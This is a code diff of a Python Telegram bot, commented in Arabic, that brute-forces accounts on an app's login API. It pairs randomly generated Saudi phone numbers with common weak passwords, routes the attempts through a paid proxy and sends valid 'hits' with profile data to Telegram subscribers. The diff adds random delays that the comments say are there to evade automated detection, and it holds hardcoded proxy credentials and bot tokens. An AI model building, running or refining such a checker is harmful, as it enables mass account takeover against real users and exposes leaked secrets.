@@ -19,25 +19,18 @@ from Crypto.Util.Padding import pad
 import telebot
 from telebot import types
 
-# === إعدادات البروكسي الخاص بك مع التغيير التلقائي مع كل فحص ===
+# === إعدادات البروكسي المدفوع الجديد ===
 def get_proxy():
     """
-    توليد معرف جلسة عشوائي مع كل استدعاء لإجبار مزود البروكسي 
-    على تغيير الـ IP بنسبة 100% مع كل طلب فحص جديد.
+    إعدادات البروكسي المدفوع المخصص لضمان استقرار الاتصال.
     """
-    session_id = random.randint(1000000, 9999999)
-    # إضافة لاحقة الجلسة العشوائية لاسم المستخدم الخاص بك لتغيير الـ IP فوراً
-    username = f"user0e9234bb_session_{session_id}"
-    password = "51e5211a276c"
-    
-    proxy_url = f"http://{username}:{password}@169.197.82.58:16645"
     return {
-        "http": proxy_url,
-        "https": proxy_url,
+        "http": "http://user0e9234bb:51e5211a276c@169.197.82.58:16645",
+        "https": "http://user0e9234bb:51e5211a276c@169.197.82.58:16645",
     }
 
-# === إعدادات البوت والمطور ===
-TG_TOKEN = "8844579780:AAH_-8fTwYgelZgo-Q6JOK2trcqSMdorqZ0"
+# === إعدادات البوت والمطور ==
+TG_TOKEN = "8643610223:AAEao9Ibitaybb0iwRkDg-9K5h28b08JGYM"
 ADMIN_ID = 8795120325  # آيدي المطور
 
 bot = telebot.TeleBot(TG_TOKEN)
@@ -56,7 +49,7 @@ ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)
 
 # تخزين جلسات المشتركين بشكل مستقل تماماً
 user_sessions: Dict[int, Dict[str, Any]] = {}
-scan_threads = 20  # رفع السرعة الافتراضية للثريدز لتناسب الفحص السريع
+scan_threads = 20  # السرعة الافتراضية للثريدز
 
 # تخزين المشتركين: {user_id: expiry_timestamp}
 subscribers: Dict[int, float] = {}
@@ -171,7 +164,7 @@ def buildrequest(body, country="SA"):
 
 def build_payload(mobile, password, country="SA"):
     device, android, shumeng, nonce = gendevice()
-    area_code = "966"  # مخصص للسعودية فقط
+    area_code = "966"
     
     data = {
         "mobile": mobile, "areaCode": area_code, "password": password,
@@ -271,11 +264,9 @@ def fetch_profile(session_req, token, user_id, login_data=None, country="SA"):
             continue
     return None
 
-# === تنسيق تقرير الصيد الكامل للإرسال عبر تليجرام ===
 def format_hit_message(data, mobile, password, country, prof):
     raw_name = data.get('name') or data.get('nickName', '—')
     name = html.escape(str(raw_name))
-    uid  = data.get('showNumId') or data.get('id', '—')
     
     area_prefix = "+966"
     country_label = "السعودية 🇸🇦"
@@ -307,7 +298,6 @@ def format_hit_message(data, mobile, password, country, prof):
     lines.append("\nBy - @aboodriad")
     return "\n".join(lines)
 
-# === مولد أرقام السعودية فقط ===
 def generate_saudi_number() -> str:
     prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
     return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
@@ -336,7 +326,6 @@ def get_user_session(user_id: int) -> Dict[str, Any]:
         }
     return user_sessions[user_id]
 
-# === لوحات التحكم ===
 def get_control_keyboard(user_id: int):
     session = get_user_session(user_id)
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -429,10 +418,10 @@ def callback_handler(call):
         t.start()
         session["thread"] = t
 
-        bot.answer_callback_query(call.id, "✅ تم بدء الفحص السريع (السعودية 🇸🇦)")
+        bot.answer_callback_query(call.id, "✅ تم بدء الفحص بالبروكسي المدفوع (السعودية 🇸🇦)")
         markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
         bot.edit_message_text(
-            f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بسرعة عالية...</b>\n\n"
+            f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بالبروكسي المدفوع...</b>\n\n"
             f"✅ صيد (Valid): {session['valid_count']}\n"
             f"❌ خطأ (Wrong): {session['wrong_count']}\n"
             f"⚠️ أخطاء اتصال (Errors): {session['error_count']}",
@@ -536,20 +525,22 @@ def run_checker_loop(chat_id, user_id, msg_id):
         'Aa100200', 'Aa10203040', 'Aa102030', 'As123123',
         'Aa11223344', 'Aa123456', 'Aa12345678', 'Ali112233',
         'Aa123456789', 'Ali100200', 'Ali20002000', 'Ahmed100200',
-        'Ahmad123123', 'qwer1234', 'qwer4321', 'q1w2e3r4', '1q2w3e4r',
-        'Aa12341234','Aa123123@','Aa123123@@',
+        'Ahmad123123', 'qwer1234', 'qwer4321', 'q1w2e3r4', '1q2w3e4r'
     ]
 
     def worker():
         session_req = requests.Session()
         while session["is_running"] and not session["stop_event"].is_set():
-            country = "SA"  # السعودية فقط
+            country = "SA"
             mobile = generate_saudi_number()
             
             with session["stats_lock"]:
                 if mobile in session["tried"]:
                     continue
                 session["tried"].add(mobile)
+
+            # إضافة تأخير عشوائي دقيق (Jitter) لتفادي الكشف الآلي
+            time.sleep(random.uniform(0.1, 0.35))
 
             password = random.choice(passwords)
             password_hashed = md5upper(password)
@@ -562,6 +553,8 @@ def run_checker_loop(chat_id, user_id, msg_id):
             except Exception:
                 with session["stats_lock"]:
                     session["error_count"] += 1
+                # فترة انتظار قصيرة في حال حدوث خطأ شبكي لمنع تكرار الضغط السريع
+                time.sleep(1)
                 continue
 
             with session["stats_lock"]:
@@ -601,7 +594,7 @@ def run_checker_loop(chat_id, user_id, msg_id):
                 
             with session["stats_lock"]:
                 status_text = (
-                    f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بسرعة عالية...</b>\n\n"
+                    f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بالبروكسي المدفوع...</b>\n\n"
                     f"✅ صيد (Valid): {session['valid_count']}\n"
                     f"❌ خطأ (Wrong): {session['wrong_count']}\n"
                     f"⚠️ أخطاء اتصال (Errors): {session['error_count']}"
@@ -614,5 +607,5 @@ def run_checker_loop(chat_id, user_id, msg_id):
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running for Saudi Arabia (SA) only with your custom rotating proxy...")
+    print("🤖 Bot is running with the custom paid proxy for Saudi Arabia (SA) successfully...")
     bot.infinity_polling()
